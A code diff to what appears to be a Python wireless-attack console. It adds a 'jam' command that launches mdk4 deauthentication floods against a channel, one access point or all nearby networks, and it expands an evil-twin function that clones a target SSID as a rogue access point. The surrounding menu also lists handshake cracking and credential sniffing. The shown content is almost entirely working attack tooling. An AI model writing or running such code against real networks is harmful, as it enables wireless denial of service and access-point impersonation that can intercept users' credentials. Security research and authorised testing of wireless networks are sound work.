@@ -57,6 +57,8 @@ def main():
                 select_interface(command)
             elif command == "deauth":
                 run_deauth()
+            elif command == "jam":
+                wifi_jamming()
             elif command == "wps":
                 run_wps_attack()
             elif command == "handshake":
@@ -142,13 +144,14 @@ def display_help():
         ["select", "Select a wireless interface (e.g., 'select wlan0')"],
         ["status", "Show current status and selected interface"],
         ["scan", "Scan for wireless networks with details"],
-        ["scanclients", "Scan for clients connected to a specific AP"],  # New command
+        ["scanclients", "Scan for clients connected to a specific AP"],
         ["monitor", "Put wireless interface in monitor mode"],
         ["managed", "Return wireless interface to managed mode"],
         ["capture", "Capture wireless packets (with filtering options)"],
         ["handshake", "Capture WPA handshakes from target networks"],
         ["crack", "Attempt to crack captured handshakes"],
         ["deauth", "Send deauthentication packets to targets"],
+        ["jam", "Perform Wi-Fi jamming attacks"],  
         ["wps", "Test for WPS vulnerabilities"],
         ["evil", "Create an evil twin access point"],
         ["sniff", "Sniff wireless traffic for credentials"],
@@ -806,29 +809,69 @@ def evil_twin_attack():
     print("\n[*] Evil Twin Access Point Setup")
     print("[!] Warning: This requires a second wireless interface for internet connection")
     
-    target_ssid = input("Enter target SSID to clone: ").strip()
-    if not target_ssid:
-        print("[!] SSID is required")
-        return
+    scan_option = input("Scan for networks first? (y/n) [y]: ").strip().lower() or "y"
+    if scan_option == "y":
+        print("[*] Scanning for networks to clone...")
+        scan_process = subprocess.Popen(["airodump-ng", selected_interface])
+        current_processes.append(("airodump-ng-scan", scan_process))
+        
+        try:
+            print("\n[*] Press Ctrl+C when you see your target network")
+            scan_process.wait()
+        except KeyboardInterrupt:
+            stop_process("airodump-ng-scan")
+    
+    print("\nSSID Options:")
+    print("1. Clone an existing network")
+    print("2. Create a custom named network")
+    
+    ssid_option = input("\nSelect option [1]: ").strip() or "1"
+    
+    if ssid_option == "1":
+        target_ssid = input("Enter target SSID to clone: ").strip()
+        if not target_ssid:
+            print("[!] SSID is required")
+            return
+        ap_name = target_ssid
+    else:
+        ap_name = input("Enter custom SSID for the access point: ").strip()
+        if not ap_name:
+            print("[!] SSID is required")
+            return
     
     channel = input("Enter channel to use [1]: ").strip() or "1"
+    
+    security_option = input("Add password protection? (y/n) [n]: ").strip().lower() or "n"
+    password = ""
+    
+    if security_option == "y":
+        password = input("Enter password (min 8 characters): ").strip()
+        if len(password) < 8:
+            print("[!] Password must be at least 8 characters")
+            return
     
     second_interface = input("Enter interface for internet connection: ").strip()
     if not second_interface:
         print("[!] Second interface is required for internet connection")
         return
     
-    print(f"\n[*] Setting up Evil Twin AP '{target_ssid}' on channel {channel}...")
+    print(f"\n[*] Setting up Evil Twin AP '{ap_name}' on channel {channel}...")
     
     try:
         subprocess.run(["rfkill", "unblock", "wifi"], check=False)
         
         with open("hostapd.conf", "w") as f:
             f.write(f"interface={selected_interface}\n")
-            f.write(f"ssid={target_ssid}\n")
+            f.write(f"ssid={ap_name}\n")
             f.write(f"channel={channel}\n")
             f.write("driver=nl80211\n")
             f.write("hw_mode=g\n")
+            
+            if security_option == "y":
+                f.write("wpa=2\n")
+                f.write("wpa_key_mgmt=WPA-PSK\n")
+                f.write("wpa_pairwise=CCMP\n")
+                f.write(f"wpa_passphrase={password}\n")
         
         with open("dnsmasq.conf", "w") as f:
             f.write(f"interface={selected_interface}\n")
@@ -861,6 +904,8 @@ def evil_twin_attack():
         current_processes.append(("hostapd", hostapd_proc))
         
         print("\n[+] Evil Twin AP is running!")
+        if security_option == "y":
+            print(f"[+] Network: {ap_name} | Password: {password}")
         print("[*] Press Ctrl+C to stop")
         
         hostapd_proc.wait()
@@ -873,6 +918,92 @@ def evil_twin_attack():
         stop_process("dnsmasq")
         stop_process("hostapd")
         print("[+] Evil Twin AP stopped")
+
+def wifi_jamming():
+    if not check_interface_selected():
+        return
+    
+    if get_interface_mode(selected_interface) != "Monitor":
+        print("[*] Interface is not in monitor mode, switching now...")
+        wifi_monitor_mode()
+    
+    print(f"\n[*] Wi-Fi Jamming Setup using {selected_interface}...")
+    
+    print("\nJamming Options:")
+    print("1. Jam all networks on a specific channel")
+    print("2. Jam a specific access point")
+    print("3. Jam all networks (channel hopping)")
+    
+    option = input("\nSelect option [1]: ").strip() or "1"
+    
+    try:
+        if option == "1":
+            channel = input("Enter channel to jam: ").strip()
+            if not channel:
+                print("[!] Channel is required")
+                return
+                
+            print(f"[*] Setting channel to {channel}...")
+            subprocess.run(["iwconfig", selected_interface, "channel", channel], check=False)
+            
+            print("[*] Starting jamming on all networks on channel " + channel + "...")
+            jam_cmd = [
+                "mdk4", 
+                selected_interface, 
+                "d", 
+                "-c", channel
+            ]
+            
+        elif option == "2":
+            target_bssid = input("Enter target AP MAC address: ").strip()
+            if not target_bssid:
+                print("[!] Target MAC address is required")
+                return
+                
+            channel = input("Enter channel of the target AP: ").strip()
+            if not channel:
+                print("[!] Channel is required for targeted jamming")
+                return
+                
+            print(f"[*] Setting channel to {channel}...")
+            subprocess.run(["iwconfig", selected_interface, "channel", channel], check=False)
+            
+            with open("target_ap.lst", "w") as f:
+                f.write(target_bssid + "\n")
+                
+            print("[*] Starting targeted jamming on " + target_bssid + "...")
+            jam_cmd = [
+                "mdk4", 
+                selected_interface, 
+                "d", 
+                "-b", "target_ap.lst", 
+                "-c", channel
+            ]
+            
+        else:  
+            print("[*] Starting jamming on all networks (channel hopping)...")
+            jam_cmd = [
+                "mdk4", 
+                selected_interface, 
+                "d"
+            ]
+        
+        print(f"\n[*] Running: {' '.join(jam_cmd)}")
+        print("[*] Press Ctrl+C to stop jamming")
+        
+        process = subprocess.Popen(jam_cmd)
+        current_processes.append(("mdk4", process))
+        process.wait()
+        
+    except KeyboardInterrupt:
+        print("\n[*] Stopping jamming...")
+    except Exception as e:
+        print(f"[!] Error during jamming: {e}")
+    finally:
+        stop_process("mdk4")
+        if os.path.exists("target_ap.lst"):
+            os.remove("target_ap.lst")
+        print("[+] Jamming stopped")        
 
 def wifi_packet_sniffing():
     if not check_interface_selected():
